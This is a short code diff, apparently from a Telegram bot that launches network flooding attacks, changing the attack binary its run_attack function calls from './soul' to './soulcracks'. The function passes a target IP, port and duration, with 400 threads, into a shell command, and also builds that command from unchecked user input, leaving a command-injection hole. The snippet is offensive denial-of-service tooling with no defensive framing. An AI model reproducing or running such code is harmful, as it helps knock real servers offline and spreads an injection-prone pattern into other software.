@@ -33,7 +33,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     logger.info(f"Initiating attack: Target {ip}:{port} for {duration} seconds.")
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./soul {ip} {port} {duration} 400",
+            f"./soulcracks {ip} {port} {duration} 400",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
